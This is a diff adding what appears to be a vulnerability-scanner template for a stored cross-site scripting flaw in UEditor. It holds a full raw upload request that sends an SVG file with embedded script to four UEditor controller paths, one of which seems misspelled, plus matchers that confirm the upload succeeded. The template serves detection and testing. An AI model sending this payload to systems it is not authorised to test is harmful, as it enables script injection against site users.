@@ -1,0 +1,61 @@
+id: ueditor-xss
+
+info:
+  name: ueditor Cross Site Scripting
+  author: pwnhxl
+  severity: medium
+  description: UEditor contains an Cross Site Scripting vulnerability.
+  reference:
+    - https://blog.csdn.net/weixin_50464560/article/details/124803185
+    - https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3
+  tags: ueditor,xss
+
+variables:
+  randstring: "{{to_lower(rand_base(16))}}"
+
+requests:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Origin: http://{{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstring}}
+
+        ------WebKitFormBoundary{{randstring}}
+        Content-Disposition: form-data; name="upfile"; filename="test.xml"
+        Content-Type: application/vnd.ms-excel
+
+        <?xml version="1.0" standalone="no"?>
+        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+           <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+           <script type="text/javascript">
+              alert({{randstring}});
+           </script>
+        </svg>
+        ------WebKitFormBoundary{{randstring}}--
+
+    payloads:
+      path:
+        - "/ueditor/jsp/controller.jsp?action=uploadfile"
+        - "/ueditor/php/controller.php?action=uploadfile"
+        - "/ueditor/net/controller.ashx?action=uploadfile"
+        - "/ueditor/asp/controller.asp?action=uploadfilep"
+    attack: batteringram
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'state'
+          - 'SUCCESS'
+          - 'original'
+          - '.xml'
+          - '399'
+        condition: and
+
+      - type: status
+        status:
+          - 200
